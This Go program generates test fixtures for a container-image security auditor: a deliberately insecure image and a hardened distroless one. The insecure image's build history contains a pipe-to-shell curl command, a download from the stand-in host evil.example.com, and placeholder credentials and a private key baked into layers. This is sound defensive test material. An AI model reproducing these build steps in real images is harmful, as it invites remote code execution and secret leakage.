// Command gen builds the committed fixture images used by the imageaudit tests.
// It lives under testdata/ so the Go tool ignores it (testdata is never
// compiled). Regenerate the fixtures with:
//
//	go run ./internal/modules/imageaudit/testdata/gen
//
// The fixtures are deterministic docker-save tarballs: one deliberately
// insecure image that trips the rule set, and one hardened/distroless image
// that should score clean. Keeping the generator committed makes the binary
// fixtures auditable and reproducible rather than opaque blobs.
package main

import (
	"archive/tar"
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
)

func main() {
	outDir := "internal/modules/imageaudit/testdata"
	if len(os.Args) > 1 {
		outDir = os.Args[1]
	}
	if err := os.MkdirAll(outDir, 0o755); err != nil {
		panic(err)
	}
	write(filepath.Join(outDir, "insecure.tar"), insecureImage())
	write(filepath.Join(outDir, "distroless.tar"), distrolessImage())
	fmt.Println("wrote fixtures to", outDir)
}

func write(path string, data []byte) {
	if err := os.WriteFile(path, data, 0o644); err != nil {
		panic(err)
	}
	fmt.Printf("  %s (%d bytes)\n", path, len(data))
}

// entry is a single file placed into a layer, carrying its Unix mode so setuid
// bits survive into the fixture.
type entry struct {
	name string
	mode int64
	data string
}

func tarOf(entries []entry) []byte {
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, e := range entries {
		if err := tw.WriteHeader(&tar.Header{
			Name:     e.name,
			Mode:     e.mode,
			Size:     int64(len(e.data)),
			Typeflag: tar.TypeReg,
		}); err != nil {
			panic(err)
		}
		if _, err := tw.Write([]byte(e.data)); err != nil {
			panic(err)
		}
	}
	if err := tw.Close(); err != nil {
		panic(err)
	}
	return buf.Bytes()
}

func dockerSave(config []byte, repoTags []string, layers map[string][]byte, layerOrder []string) []byte {
	manifest, _ := json.Marshal([]map[string]any{{
		"Config":   "config.json",
		"RepoTags": repoTags,
		"Layers":   layerOrder,
	}})
	files := map[string][]byte{
		"manifest.json": manifest,
		"config.json":   config,
	}
	for name, data := range layers {
		files[name] = data
	}
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	// Deterministic order: manifest, config, then layers as listed.
	writeFile(tw, "manifest.json", files["manifest.json"])
	writeFile(tw, "config.json", files["config.json"])
	for _, l := range layerOrder {
		writeFile(tw, l, files[l])
	}
	if err := tw.Close(); err != nil {
		panic(err)
	}
	return buf.Bytes()
}

func writeFile(tw *tar.Writer, name string, data []byte) {
	if err := tw.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: int64(len(data)), Typeflag: tar.TypeReg}); err != nil {
		panic(err)
	}
	if _, err := tw.Write(data); err != nil {
		panic(err)
	}
}

// insecureImage is a maximally-bad image: root, secrets in ENV, SSH + privileged
// ports, a sensitive VOLUME, setuid binaries, a shell and a package manager,
// dangerous build history, and a "deleted" secret still recoverable in layer 0.
func insecureImage() []byte {
	config := []byte(`{
  "architecture": "amd64",
  "os": "linux",
  "config": {
    "User": "",
    "ExposedPorts": {"22/tcp": {}, "80/tcp": {}, "8080/tcp": {}},
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE",
      "DB_PASSWORD=hunter2supersecret"
    ],
    "Volumes": {"/proc": {}, "/data": {}},
    "Cmd": ["/bin/sh"],
    "Labels": {}
  },
  "history": [
    {"created_by": "/bin/sh -c #(nop) ADD file:abc in /"},
    {"created_by": "/bin/sh -c apt-get update && apt-get install -y curl"},
    {"created_by": "/bin/sh -c curl https://example.com/install.sh | sh"},
    {"created_by": "/bin/sh -c #(nop)  ENV DB_PASSWORD=hunter2supersecret", "empty_layer": true},
    {"created_by": "/bin/sh -c #(nop) ADD https://evil.example.com/tool /usr/local/bin/tool"},
    {"created_by": "/bin/sh -c chmod 777 /app/run.sh"}
  ]
}`)

	layer0 := tarOf([]entry{
		{"etc/os-release", 0o644, "ID=ubuntu\nVERSION_ID=22.04\n"},
		{"bin/sh", 0o755, "\x7fELF shell"},
		{"usr/bin/apt-get", 0o755, "\x7fELF apt"},
		{"usr/bin/sudo", 0o4755, "\x7fELF sudo"},  // setuid
		{"usr/bin/passwd", 0o4755, "\x7fELF pwd"}, // setuid
		{"usr/bin/wall", 0o2755, "\x7fELF wall"},  // setgid
		{"app/run.sh", 0o777, "#!/bin/sh\necho hi\n"},
		{"app/secret.key", 0o600, "-----BEGIN RSA PRIVATE KEY-----\nMIIabc123\n-----END RSA PRIVATE KEY-----\n"},
	})
	// Layer 1 "removes" the private key with a whiteout — but layer 0 still holds
	// the bytes, so the deletion is recoverable.
	layer1 := tarOf([]entry{
		{"app/.wh.secret.key", 0o644, ""},
		{"app/new.txt", 0o644, "just data\n"},
	})

	return dockerSave(config, []string{"myapp:latest"},
		map[string][]byte{"layer0.tar": layer0, "layer1.tar": layer1},
		[]string{"layer0.tar", "layer1.tar"})
}

// distrolessImage is a hardened image: non-root user, HEALTHCHECK, full
// provenance labels, one unprivileged port, no secrets, and a shell-less,
// package-manager-less, setuid-free filesystem.
func distrolessImage() []byte {
	config := []byte(`{
  "architecture": "amd64",
  "os": "linux",
  "config": {
    "User": "65532",
    "ExposedPorts": {"8080/tcp": {}},
    "Env": [
      "PATH=/usr/local/bin:/usr/bin:/bin",
      "LANG=C.UTF-8"
    ],
    "Cmd": ["/app/server"],
    "Healthcheck": {"Test": ["CMD", "/app/server", "-health"]},
    "Labels": {
      "org.opencontainers.image.source": "https://github.com/example/app",
      "org.opencontainers.image.version": "1.2.3",
      "org.opencontainers.image.licenses": "Apache-2.0",
      "org.opencontainers.image.authors": "team@example.com"
    }
  },
  "history": [
    {"created_by": "COPY /app/server /app/server # buildkit"}
  ]
}`)

	layer0 := tarOf([]entry{
		{"app/server", 0o755, "\x7fELF server"},
		{"etc/passwd", 0o644, "root:x:0:0:root:/root:/sbin/nologin\nnonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin\n"},
		{"etc/os-release", 0o644, "ID=distroless\n"},
	})

	return dockerSave(config, []string{"myapp:1.2.3"},
		map[string][]byte{"layer0.tar": layer0},
		[]string{"layer0.tar"})
}
